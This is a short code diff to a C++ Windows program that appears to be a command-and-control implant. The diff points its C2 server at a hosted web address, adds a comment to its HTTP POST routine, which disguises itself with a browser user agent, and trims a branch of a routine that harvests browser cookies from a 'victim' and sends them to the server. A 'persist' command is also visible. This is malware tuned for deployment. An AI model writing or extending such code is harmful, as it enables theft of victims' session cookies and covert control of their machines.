@@ -14,7 +14,7 @@
 // ============================================
 // CONFIGURATION - CHANGE THESE
 // ============================================
-const char* C2_SERVER    = "http://YOUR_IP:8080";
+const char* C2_SERVER = "https://your-app.onrender.com";
 const int   POLL_INTERVAL = 30000;   // 30 seconds
 const int   HEARTBEAT_INT = 60000;   // 60 seconds
 // ============================================
@@ -298,7 +298,7 @@ private:
     }
 
     std::string HttpPost(const std::string& endpoint, const std::string& jsonBody) {
-        std::string fullURL = serverURL + endpoint;
+        std::string fullURL = serverURL + endpoint; // e.g., "/checkin"
 
         HINTERNET hNet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
@@ -517,8 +517,6 @@ private:
             harvester.HarvestAll();
             if (harvester.HasCookies()) {
                 c2.SendExfil(victimID, harvester.GetFormattedOutput(3), "cookies");
-            } else {
-                c2.SendExfil(victimID, "No cookies found", "cookies");
             }
         }
         else if (cmd == "persist") {
